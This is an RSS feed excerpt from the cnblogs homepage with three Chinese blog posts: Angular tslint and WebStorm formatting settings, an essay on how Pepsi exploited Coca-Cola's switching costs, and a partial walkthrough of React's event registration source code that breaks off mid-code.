<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>Angular（03）-- lint风格规范和WebStorm小技巧 - 请叫我大苏</title>
<link>http://www.cnblogs.com/dasusu/p/10582126.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/dasusu/p/10582126.html</guid>
<description>&lt;p&gt;在开始讲 Angular 各个核心知识点之前，想先来讲讲开发工具 WebStorm 的一些配置以及相应配置文件如 tslint.json 的配置。&lt;/p&gt;
&lt;p&gt;因为我个人比较注重代码规范、代码风格，而对于这些规范，我只有一个观点：&lt;strong&gt;一切需要依赖开发人员的主观意识去遵守的规范都没有多大意义。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以前做 Android 开发时会借助 AndroidStudio 来强制遵守一些规范，现在前端项目我用的是 WebStorm 开发，这两个开发工具本质上同源，所以很多功能都差不多。&lt;/p&gt;
&lt;p&gt;那么，这篇就来讲一讲，如何对 WebStorm 进行一些设置，让它可以更好的辅助我们遵守风格规范，同时，理清一些比如 tslint.json 的配置，来让开发工具实时检测我们写的代码是否有很好的遵守规范。&lt;/p&gt;

&lt;p&gt;Angular 项目的很多文件都是通过 Angular-CLI 工具的 ng 命令来生成的，生成时就有默认一些代码风格，而且，WebStorm 默认也有一些代码风格，也许有人觉得直接使用默认的风格来即可。&lt;/p&gt;
&lt;p&gt;但对于默认的一些风格规范，我不是很赞同，比如说：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;name: string = 'dasu'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;简单的在某个类中声明这么一个 name 变量，类型是 string，初始值为 dasu，但默认的 tslint.json 配置的代码风格会报错，因为它建议我们，既然已经初始化为字符串类型了，就没有必要再去声明变量的类型了。&lt;/p&gt;
&lt;p&gt;对于这种默认风格，我个人并不赞同，因为个人习惯了 Java 的风格，对于变量的类型声明已经习惯了，更何况，这个初始值有可能在未来被去掉，那么，这时候岂不是还要去加上类型说明？&lt;/p&gt;
&lt;p&gt;所以，我个人还是比较习惯声明变量的类型，不管有没有对其进行初始化。&lt;/p&gt;
&lt;p&gt;以上只是个简单的例子，默认的一些代码风格，我个人都不是很习惯，所以，下面列举我的个人代码风格，供大伙借鉴、参考。&lt;/p&gt;
&lt;p&gt;不多，只有几点而已，因为大多直接使用默认的代码风格，只是默认的一些风格中，我不是很习惯的情况下，才会对其进行修改。&lt;/p&gt;
&lt;h4 id=&quot;命名方面&quot;&gt;命名方面&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;私有属性和方法以 &lt;code&gt;_&lt;/code&gt; 一个下划线开头，并添加 &lt;code&gt;private&lt;/code&gt; 修饰符&lt;/li&gt;
&lt;li&gt;公有属性和方法使用默认的不加修饰符&lt;/li&gt;
&lt;li&gt;与组件对应的模板 html 绑定事件相关的方法，以 &lt;code&gt;on&lt;/code&gt; 为前缀&lt;/li&gt;
&lt;li&gt;组件的输出属性（@Output) 不以 &lt;code&gt;on&lt;/code&gt; 为前缀&lt;/li&gt;
&lt;li&gt;表格数据的 *ngFor 指令时，建议以 item 命名每一项，如 &lt;code&gt;*ngFor=&quot;let item of page?.result&quot;&lt;/code&gt; 这样便于各个页面的代码直接复制粘贴&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;格式&quot;&gt;格式&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;HTML 中使用 &lt;code&gt;&quot;&quot;&lt;/code&gt; 双引号，ts 中使用 &lt;code&gt;''&lt;/code&gt; 单引号&lt;/li&gt;
&lt;li&gt;HTML 和 ts 的缩进都使用 4 个空格&lt;/li&gt;
&lt;li&gt;局部变量允许使用 let，并不一定强制使用 const&lt;/li&gt;
&lt;li&gt;所有变量声明时直接指明其类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;创建一个新的 Angular 项目时，会自动生成项目的脚手架，里面包括了各种各样的文件，其中有一份是 tslint.json 文件，是用来给 WebStorm 实时对代码进行 lint 检测时的代码风格配置。&lt;/p&gt;
&lt;p&gt;我修改了部分默认的配置，下面给出的是所有项的配置，其中带有注释的配置项，就是我增加或修改原本默认的配置项，是基于我上面说的个人的一些习惯风格而进行的修改：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&quot;rules&quot;: {
    &quot;arrow-return-shorthand&quot;: true,
    &quot;adjacent-overload-signatures&quot;: true, // override 函数是否集中放置 (新增)
    &quot;callable-types&quot;: true,
    &quot;class-name&quot;: true,
    &quot;comment-format&quot;: [
      true,
      &quot;check-space&quot;
    ],
    &quot;curly&quot;: true,
    &quot;deprecation&quot;: {
      &quot;severity&quot;: &quot;warn&quot;
    },
    &quot;eofline&quot;: false,  // 文件末尾是否需要空新行 (默认 true)
    &quot;encoding&quot;: true,  // 文件编码是否默认 UTF-8 (新增)
    &quot;forin&quot;: true,
    &quot;import-blacklist&quot;: [
      true,
      &quot;rxjs/Rx&quot;
    ],
    &quot;import-spacing&quot;: true,
    &quot;indent&quot;: [
      true,
      &quot;spaces&quot;
    ],
    &quot;interface-over-type-literal&quot;: true,
    &quot;label-position&quot;: true,
    &quot;max-line-length&quot;: [
      true,
      240 // 默认140，我屏幕挺大的，所以并不反感某一行代码过长，相反，很多代码因为自动换行后，我个人感觉更不习惯，还不如我手动来选择从某个地方换行
    ],
    &quot;member-access&quot;: false,
    &quot;member-ordering&quot;: [
      true,
      {
        &quot;order&quot;: [
          &quot;static-field&quot;,
          &quot;instance-field&quot;,
          &quot;static-method&quot;,
          &quot;instance-method&quot;
        ]
      }
    ],
    &quot;no-arg&quot;: true,
    &quot;no-bitwise&quot;: true,
    &quot;no-console&quot;: [
      true,
      &quot;debug&quot;,
      &quot;info&quot;,
      &quot;time&quot;,
      &quot;timeEnd&quot;,
      &quot;trace&quot;
    ],
    &quot;no-construct&quot;: true,
    &quot;no-consecutive-blank-lines&quot;: [  // 空白行最多几行 (新增)
      true,
      3
    ],
    &quot;no-debugger&quot;: false,
    &quot;no-duplicate-super&quot;: true,
    &quot;no-duplicate-switch-case&quot;: true, // 是否禁止重复 case (新增)
    &quot;no-duplicate-imports&quot;: true,     // 是否禁止重复 import (新增)
    &quot;no-duplicate-variable&quot;: [        // 是否禁止重复变量声明 (新增)
      true,
      &quot;check-parameters&quot;
    ],
    &quot;no-conditional-assignment&quot;: true, // 禁止在分支条件判断中有赋值操作 (新增)
    &quot;no-empty&quot;: false,
    &quot;no-empty-interface&quot;: true,
    &quot;no-eval&quot;: true,
    &quot;no-inferrable-types&quot;: [  // 是否禁止在有初始值的变量声明上，增加类型声明 (默认 true)
      false,
      &quot;ignore-params&quot;
    ],
    &quot;no-mergeable-namespace&quot;: true, // 是否禁止重复的命名空间 (新增)
    &quot;no-misused-new&quot;: true,
    &quot;no-non-null-assertion&quot;: true,
    &quot;no-shadowed-variable&quot;: true,
    &quot;no-string-literal&quot;: false,
    &quot;no-string-throw&quot;: true,
    &quot;no-switch-case-fall-through&quot;: true,
    &quot;no-trailing-whitespace&quot;: false,      // 是否禁止末尾空格 (默认 true)
    &quot;no-unnecessary-initializer&quot;: true,
    &quot;no-unused-expression&quot;: false,  // 是否允许无用的表达式存在 (默认 true)
    &quot;no-unused-variable&quot;: false,   // 是否允许无用的变量存在 (新增)
    &quot;no-use-before-declare&quot;: true,
    &quot;no-unsafe-finally&quot;: true,
    &quot;no-for-in-array&quot;: true,
    &quot;no-var-keyword&quot;: true,
    &quot;object-literal-sort-keys&quot;: false,
    &quot;one-line&quot;: [
      true,
      &quot;check-open-brace&quot;,
      &quot;check-catch&quot;,
      &quot;check-else&quot;,
      &quot;check-whitespace&quot;
    ],
    &quot;prefer-const&quot;: false,  // 不强制使用 const，允许使用 let
    &quot;quotemark&quot;: [  // 引号设置，ts 中单引号
      true,
      &quot;single&quot;,
      &quot;jsx-double&quot;,
      &quot;avoid-escape&quot;,
      &quot;avoid-template&quot;
    ],
    &quot;radix&quot;: true,
    &quot;semicolon&quot;: [
      true,
      &quot;always&quot;,
      &quot;ignore-interfaces&quot;
    ],
    &quot;space-within-parens&quot;: [
      true,
      0
    ],
    &quot;triple-equals&quot;: [
      true,
      &quot;allow-null-check&quot;
    ],
    &quot;typedef-whitespace&quot;: [
      true,
      {
        &quot;call-signature&quot;: &quot;nospace&quot;,
        &quot;index-signature&quot;: &quot;nospace&quot;,
        &quot;parameter&quot;: &quot;nospace&quot;,
        &quot;property-declaration&quot;: &quot;nospace&quot;,
        &quot;variable-declaration&quot;: &quot;nospace&quot;
      }
    ],
    &quot;unified-signatures&quot;: true,
    &quot;variable-name&quot;: false,
    &quot;whitespace&quot;: [
      true,
      &quot;check-branch&quot;,
      &quot;check-decl&quot;,
      &quot;check-operator&quot;,
      &quot;check-separator&quot;,
      &quot;check-type&quot;
    ],
    &quot;no-output-on-prefix&quot;: true,
    &quot;use-input-property-decorator&quot;: true,
    &quot;use-output-property-decorator&quot;: true,
    &quot;use-host-property-decorator&quot;: true,
    &quot;no-input-rename&quot;: true,
    &quot;no-output-rename&quot;: true,
    &quot;use-life-cycle-interface&quot;: true,
    &quot;use-pipe-transform-interface&quot;: true,
    &quot;component-class-suffix&quot;: true,
    &quot;directive-class-suffix&quot;: true
  }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;tslint.json 文件只是用来在执行 &lt;code&gt;ng lint&lt;/code&gt; 命令，或者代码编程过程中，开发工具实时检测，当检测到不符合风格规范的代码时，进行报错处理。&lt;/p&gt;
&lt;p&gt;虽然可以在执行 &lt;code&gt;ng lint --fix&lt;/code&gt; 时添加 &lt;code&gt;--fix&lt;/code&gt; 参数来自动修正一些风格错误，但这种方式很耗时，而是代码编写过程中，也没法应用。&lt;/p&gt;
&lt;p&gt;所以，可以借助 Webstorm 的一些配置，一些小技巧，来进行代码的格式化操作，让开发工具自动帮我们将代码整理成符合规范的风格。&lt;/p&gt;

&lt;p&gt;下面介绍的这些配置项，都是为代码的格式化操作（快捷键：&lt;code&gt;Ctrl + Alt + L&lt;/code&gt;）服务的，意思也就是说，当我们为当前文件进行代码格式化操作时，WebStorm 就会自动按照我们的这些配置项来自动整理代码，将代码整理成遵循规范的风格。&lt;/p&gt;
&lt;h3 id=&quot;标点符号引号分号逗号&quot;&gt;标点符号（引号，分号，逗号）&lt;/h3&gt;
&lt;p&gt;设置路径：&lt;code&gt;Settings -&amp;gt; Editor -&amp;gt; Code Style -&amp;gt; TypeScript -&amp;gt; Punctuation&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/1924341-a09aa1367d940f1d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里配置项很少，就三个，分别是配置分号，引号和逗号。&lt;/p&gt;
&lt;ul readability=&quot;0&quot;&gt;&lt;li&gt;第一行用来配置每行代码末尾是否需要有 &lt;code&gt;;&lt;/code&gt; 分号，且格式化时是否对旧代码（已经过格式化的代码）进行处理。&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;第二行用来配置，代码中是使用 &lt;code&gt;''&lt;/code&gt; 单引号，还是 &lt;code&gt;&quot;&quot;&lt;/code&gt; 双引号（默认是双引号），且格式化时是否对旧代码（已经过格式化的代码）进行处理。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;第三行用来配置是否需要保留，还是去掉数组或对象属性列表中，最后一项末尾的逗号。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;我的代码风格是 HTML 中使用 &lt;code&gt;&quot;&quot;&lt;/code&gt; 双引号，TypeScript 中使用 &lt;code&gt;''&lt;/code&gt; 单引号，但使用工具自动生成 ts 文件时，引号默认是双引号，或者某些时候某些因素下，代码中出现一些双引号，这时候，通过修改这个配置，在每次格式化代码时，就都会自动将双引号转成单引号，方便、高效。&lt;/p&gt;
&lt;h3 id=&quot;空格&quot;&gt;空格&lt;/h3&gt;
&lt;p&gt;设置路径：&lt;code&gt;Settings -&amp;gt; Editor -&amp;gt; Code Style -&amp;gt; TypeScript -&amp;gt; Spaces&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;格式化操作时，会自动在比如方法的 &lt;code&gt;{&lt;/code&gt; 右括号前，赋值语句的 &lt;code&gt;=&lt;/code&gt; 等号两侧等等这些位置自动加上一个空格，如果我们写代码时漏掉这些空格时。&lt;/p&gt;
&lt;p&gt;这个功能其实是根据这里的配置项来决定的，这里面默认勾选了很多，基本符合常见的风格规范：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/1924341-4444c2d4e47fe1ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
&lt;p&gt;对于空格，我没有改掉默认格式化时空格风格，只是增加了几种场景也需要自动进行空格处理，分别是：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Within -&amp;gt; ES6 import/export braces&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;导入语句 &lt;code&gt;{}&lt;/code&gt; 距离内容之间增加一个空格，默认是没有的，如：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/1924341-f7b4502ca73d1382.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Within -&amp;gt; Object literal braces 勾选&lt;/li&gt;
&lt;li&gt;Within -&amp;gt; Object literal type braces 勾选&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这两个是对象内部的空格处理，默认也是没有的，如：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/1924341-58481a48f99c1716.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;对齐和换行&quot;&gt;对齐和换行&lt;/h3&gt;
&lt;p&gt;设置路径：&lt;code&gt;Settings -&amp;gt; Editor -&amp;gt; Code Style -&amp;gt; TypeScript -&amp;gt; Wrapping and Braces&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这里是设置一些对齐或者换行策略：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Chained method calls 设置为 Wrap always&lt;/li&gt;
&lt;li&gt;Chained method calls -&amp;gt; Align when multiline 勾选&lt;/li&gt;
&lt;li&gt;Chained method calls -&amp;gt; ':' on new line 勾选&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;上面三个是用来设置方法链时，代码的整理，默认不做处理，可以改成格式化时，自动将每层的方法调用进行换行，并且对齐处理，个人建议。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/1924341-c14c88a54699907b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;'if()' statement -&amp;gt; Force braces 设置为 always&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这个是设置，即使 if 代码块内只有简单的一行代码，也要自动为其加上大括号处理，默认是不做处理。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/1924341-980fc42055c29eeb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Ternaty operation 设置为 Chop down if long&lt;/li&gt;
&lt;li&gt;Ternaty operation -&amp;gt; Align when multiline 勾选&lt;/li&gt;
&lt;li&gt;Ternaty operation -&amp;gt; '?' and ':' signs on next line 勾选&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这个是用来设置 &lt;code&gt;? :&lt;/code&gt; 运算符的处理，上面的设置意思是，当代码过长时，自动将 &lt;code&gt;?&lt;/code&gt; 和 &lt;code&gt;:&lt;/code&gt; 的代码换行，并对其处理，默认是不做处理。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/1924341-384a716038b37bb3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Array initializer 设置为 Chop down if long&lt;/li&gt;
&lt;li&gt;Array initializer -&amp;gt; Align when multiline 勾选&lt;/li&gt;
&lt;li&gt;Array initializer -&amp;gt; New line after '[' 勾选&lt;/li&gt;
&lt;li&gt;Array initializer -&amp;gt; Place ']' on new line 勾选&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这个是用来设置数组的处理，以上配置的意思是，当数组过长时，自动将每一项进行换行并对其处理，&lt;code&gt;[]&lt;/code&gt; 单独占据一行：&lt;/p&gt;
&lt;p&gt;[图片上传失败...(image-e2d886-1553268791353)]&lt;/p&gt;
&lt;p&gt;对于 Angular 中的 @NgModel 的文件来说，经常会有这种风格需要，所以就直接这么配置了。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Objects -&amp;gt; Align 设置为 On Value&lt;/li&gt;
&lt;li&gt;Variable declarations 设置为 Chop down if long&lt;/li&gt;
&lt;li&gt;Variable declarations -&amp;gt; Align 设置为 when grouped&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这个是用来设置变量或者对象的属性列表的赋值语句的对齐模式，如：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/1924341-acbb903450cf5dce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/1924341-5ac7ee768f2b644b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
&lt;p&gt;同理，也可以设置 CSS 的样式属性的对齐方式：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/1924341-b30e1b207292d771.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
&lt;p&gt;以上，只是我的个人风格习惯，大体上，我都直接按照默认的风格规范来遵守，但在个把一些项上，个人有不同的看法和习惯，所以修改掉了默认的风格配置。&lt;/p&gt;
&lt;p&gt;另外，我比较习惯使用格式化代码操作，而且一个项目中，代码全是我自己写的可能性也很小，别人写的代码或多或少都存在一些风格规范问题，也没办法强制性要求他人必须遵守，所以，就瞎折腾了下 WebStorm 的相关配置。&lt;/p&gt;
&lt;p&gt;这样，就方便我对别人的代码也直接通过格式化操作来自动进行风格规范处理。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;大家好，我是 dasu，欢迎关注我的公众号（dasuAndroidTv），公众号中有我的联系方式，欢迎有事没事来唠嗑一下，如果你觉得本篇内容有帮助到你，可以转载但记得要关注，要标明原文哦，谢谢支持~&lt;br/&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/1924341-d7190704b160d280.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;dasuAndroidTv2.png&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 15:36:00 +0000</pubDate>
<dc:creator>请叫我大苏</dc:creator>
<og:description>在开始讲 Angular 各个核心知识点之前，想先来讲讲开发工具 WebStorm 的一些配置以及相应配置文件如 tslint.json 的配置。 因为我个人比较注重代码规范、代码风格，而对于这些规范</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/dasusu/p/10582126.html</dc:identifier>
</item>
<item>
<title>689期 | 巨无霸的软肋在哪里？ -  如何在一个已经拥有巨大存量的强大敌人身边生存下来。 - honkerzh</title>
<link>http://www.cnblogs.com/honkerzh/p/10582058.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/honkerzh/p/10582058.html</guid>
<description>&lt;p&gt;假设，你是一家新兴的公司，要进入一个行业，但是这个行业里有一家传统的巨无霸，那么请问，你会从什么角度向它发起挑战？通常的思路无非是两种，一种是找它最强的地方去竞争，就是硬杠和死磕；第二种是避实击虚，找它最弱的地方去竞争。但是很可惜，这两条路在逻辑上都不大容易走得通。为什么？你想，如果你挑一家大公司的长处去竞争。它的长处又不是天上掉下来的，那也是人家努力的结果，也是在长期市场环境中演化出来的。它围绕这个长处，一定已经积累了太多看得见看不见的优势。而且，一旦它发现这个核心优势被挑战，人家又不傻，会立刻调集比你多得多的资源来围剿你。所以，即使刚开始看起来，你的做法是有点新意，那也没用啊，蚂蚁不管啃大象多少口，等大象觉得疼的时候，还是可以一脚踩死蚂蚁。&lt;/p&gt;
&lt;p&gt;但是有一个鲜明的成功案例，就是百事可乐在可口可乐几乎垄断可乐市场情况下，硬生生的拼出来一条路！他是怎么办到的呢？&lt;/p&gt;
&lt;p&gt;当时如日中天的可口可乐，做了一件特别了不起的事。就是设计出了一种流线型的瓶子。这种瓶子的设计，一直用到了今天。就是我们今天看见的那种，像曼妙的女性身材的那种弧形玻璃瓶的可口可乐。可口可乐的卖点就是这个瓶子，同时围绕这个瓶子可口可乐当时可是下了巨本，设计，广告，大批量生成这种瓶子，甚至整个生产链设计都为这个瓶子而有所改变。此时，百事可乐推出一种大瓶的可乐，容量是可口可乐的两倍，但是只卖一倍的钱。百事可乐思维是，你要是不理我，那好，我就凭借价格优势攻城略地。你要是理我，那请问你怎么理我呢？你也做一个跟我一样大的瓶子？不好意思，你会肉疼的。因为你可口可乐投了大量的资本在这个瓶子上，全球的供应链、灌装厂，还有海量的广告费，你敢换瓶子？一换，好不容易建立起来的优势就完了，此前广告费也白投了。&lt;/p&gt;
&lt;p&gt;我们如果把这个动作，仅仅看成是价格战，那么我们假设一下，假设当年百事可乐是用一样的瓶子，但是价格减半，这会发生什么？首先，一瓶可乐的成本可不光是里面的糖水啊。绝大多数成本是给整个供应链和分销商的钱。价格一减半，意味着你的供应链水平就差，给分销商的钱就少，你的利润还薄。就算价格战偷袭成功，拿下了一部分市场，也是杀敌八百，自伤一万。当然，更重要的是，如果这一招奏效，可口可乐作为一个巨无霸，应对起来就太方便了。大不了也跟着你降价。你想，一个巨无霸公司，调集资本的能力，扛住亏损的能力，是小企业没法比的。等把你百事可乐熬死了，再恢复原价就是了。而且，可口可乐做这样的动作，不需要反应时间，总部一纸令下，马上就可以跟你正面摆开战场了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一个市场里，巨无霸的软肋在哪里？既不是它的优势，也不是它的劣势。而是它的迁移成本。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那如何战胜一个巨无霸呢，或者叫如何在一个巨无霸身边生存下来呢？&lt;br/&gt;第一，让他的改变的成本巨大；&lt;br/&gt;第二，一旦改变，原来的优势就没有了，所以损失还巨大；&lt;br/&gt;第三，改变的流程很慢，时间很长。让你有机会立足市场。&lt;/p&gt;
&lt;p&gt;看到100年前百事可乐的这个案例，我觉得可以间接地明白两件事:&lt;br/&gt;第一，为什么网络时代的巨无霸企业，优势更难撼动？不仅是因为网络效应，还因为我们今天说的这个原理。因为在网络上，资源可以向水一样自由流动，迁移成本越来越小。所以，网络时代，正面挑战巨无霸成功的案例，就更少了。所以要等到产业格局变化，新进企业才有机会。&lt;/p&gt;
&lt;p&gt;第二，不论是做企业，还是做人，如果我们发现建立起来的优势，是在一个不可迁移的基础上，或者说是迁移成本很高的基础上。那这个优势，也许就没有看起来的那么大啊。&lt;/p&gt;
&lt;p&gt;注：此文大部分为得到APP所做的学习笔记，喜欢此文的朋友请下载得到APP和我一起学习吧。&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 15:24:00 +0000</pubDate>
<dc:creator>honkerzh</dc:creator>
<og:description>假设，你是一家新兴的公司，要进入一个行业，但是这个行业里有一家传统的巨无霸，那么请问，你会从什么角度向它发起挑战？通常的思路无非是两种，一种是找它最强的地方去竞争，就是硬杠和死磕；第二种是避实击虚，找</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/honkerzh/p/10582058.html</dc:identifier>
</item>
<item>
<title>React事件机制-事件注册 - Raion</title>
<link>http://www.cnblogs.com/raion/p/10581960.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/raion/p/10581960.html</guid>
<description>&lt;h3 id=&quot;事件机制&quot;&gt;事件机制&lt;/h3&gt;
&lt;p&gt;React事件主要分为两部分: 事件注册与事件分发。下面先从事件注册说起。&lt;/p&gt;
&lt;h4 id=&quot;事件注册&quot;&gt;事件注册&lt;/h4&gt;
&lt;p&gt;假设我们的程序如下:&lt;/p&gt;
&lt;pre class=&quot;html&quot;&gt;
&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
    &amp;lt;title&amp;gt;React App&amp;lt;/title&amp;gt;
  &amp;lt;/head&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;div id=&quot;root&quot;&amp;gt;&amp;lt;/div&amp;gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;import React from 'react';
import ReactDOM from 'react-dom';

class ClickCounter extends React.Component {
  constructor(props) {
    super(props);
    this.state = { count: 0 };
  }
  handleClick = () =&amp;gt; {
    this.setState((state) =&amp;gt; {
      return {count: state.count + 1};
    });
  };
  render() {
    return [
      &amp;lt;button key=&quot;1&quot; onClick={this.handleClick}&amp;gt;Update counter&amp;lt;/button&amp;gt;,
      &amp;lt;span key=&quot;2&quot;&amp;gt;{this.state.count}&amp;lt;/span&amp;gt;,
    ]
  }
}
ReactDOM.hydrate(&amp;lt;ClickCounter /&amp;gt;, document.getElementById('root'));&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;事件注册主要发生在初始化Dom属性的时候，调用&lt;code&gt;setInitialProperties&lt;/code&gt;方法，对一些类型dom进行事件绑定。&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;switch (tag) {
    case 'iframe':
    case 'object':
      trapBubbledEvent(TOP_LOAD, domElement);
      props = rawProps;
      break;

    case 'video':
    case 'audio':
      for (var i = 0; i &amp;lt; mediaEventTypes.length; i++) {
        trapBubbledEvent(mediaEventTypes[i], domElement);
      }

      props = rawProps;
      break;
    ...  
}

setInitialDOMProperties(tag, domElement, rootContainerElement, props, isCustomComponentTag);
...&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接着调用&lt;code&gt;setInitialDOMProperties&lt;/code&gt;来真正初始化Dom属性。根据当前&lt;code&gt;workInProgress&lt;/code&gt;的&lt;code&gt;pendingProps&lt;/code&gt;对象，给Dom对象设置属性。其中，有个分支会专门处理事件。&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;// registrationNameModules是一个map对象，存储着React支持的事件类型
 else if (registrationNameModules.hasOwnProperty(propKey)) {
  if (nextProp != null) {
    ensureListeningTo(rootContainerElement, propKey);
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;执行&lt;code&gt;ensureListeningTo&lt;/code&gt;方法:&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;// rootContainerElement为React应用的挂载点, registrationName为onClick
function ensureListeningTo(rootContainerElement, registrationName) {
  // 判断rootContainerElement是document还是fragment
  var isDocumentOrFragment = rootContainerElement.nodeType === DOCUMENT_NODE || rootContainerElement.nodeType === DOCUMENT_FRAGMENT_NODE;
  // 获取rootContainerElement所在的document。
  var doc = isDocumentOrFragment ? rootContainerElement : rootContainerElement.ownerDocument;
  listenTo(registrationName, doc);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;开始执行&lt;code&gt;listenTo&lt;/code&gt;方法，注册事件入口。&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;// 获取当前已监听的原生事件类型的map
var isListening = getListeningForDocument(mountAt);
// 获取对应的原生事件类型，registrationNameDependencies存储了React事件类型与浏览器原生事件类型映射的一个map
var dependencies = registrationNameDependencies[registrationName];
for (var i = 0; i &amp;lt; dependencies.length; i++) {
    var dependency = dependencies[i];
    if (!(isListening.hasOwnProperty(dependency) &amp;amp;&amp;amp; isListening[dependency])) {
        switch (dependency) {
          ...// 除了scroll blur focus cancel close方法调trapCapturedEvent方法，invalid submit reset不处理之外，其余都调trapBubbledEvent方法。
          default:
          var isMediaEvent = mediaEventTypes.indexOf(dependency) !== -1;
